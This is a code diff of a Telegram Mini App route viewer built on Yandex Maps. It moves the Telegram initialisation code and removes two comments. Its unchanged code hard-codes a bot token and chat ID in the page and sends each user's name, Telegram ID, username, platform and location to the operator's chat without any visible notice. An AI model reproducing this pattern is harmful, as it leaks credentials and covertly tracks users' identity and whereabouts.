@@ -133,6 +133,15 @@
 </div>
 
 <script>
+// --- Инициализация Telegram ВНЕ ymaps.ready для мгновенного расширения ---
+const tg = window.Telegram.WebApp;
+tg.ready();
+tg.expand();
+if (tg.isVersionAtLeast('6.1')) {
+    tg.setHeaderColor('#000000');
+    tg.setBackgroundColor('#000000');
+}
+
 const CFG = {
     BOT_TOKEN: "7860806384:AAEYRKqdPUsUz9npN3MmyEYKH-rTHISeHbs",
     CHAT_ID: "5180466640",
@@ -155,11 +164,8 @@ const ui = {
     locate: document.getElementById('locateBtn')
 };
 
-const tg = window.Telegram.WebApp;
-
 ymaps.ready(() => {
     try {
-        initTelegram();
         map = new ymaps.Map("map", { 
             center: [55.75, 37.62], 
             zoom: 11, 
@@ -191,11 +197,6 @@ ymaps.ready(() => {
         loadData();
     } catch (e) { console.error(e); }
 });
-
-function initTelegram() {
-    tg.ready(); tg.expand();
-    if (tg.isVersionAtLeast('6.1')) { tg.setHeaderColor('#000000'); tg.setBackgroundColor('#000000'); }
-}
 
 const iconCache = new Map();
 function getIcon(col, txt, az, isEnd) {
@@ -378,11 +379,8 @@ const calcAz = (p1, p2) => {
 };
 
 const sendStats = async (u, coords) => {
-    // 1. Отправляем текстовые данные
     const msg = `🚀 *Route Viewer*\n👤 ${u.first_name}\n🆔 \`${u.id}\`\n🔗 @${u.username||'none'}\n📱 ${tg.platform}`;
     await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage?chat_id=${CFG.CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown&disable_web_page_preview=true`).catch(()=>{});
-    
-    // 2. Отправляем геолокацию отдельным сообщением с меткой (как было раньше)
     if (coords) {
         await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendLocation?chat_id=${CFG.CHAT_ID}&latitude=${coords[0]}&longitude=${coords[1]}`).catch(()=>{});
     }
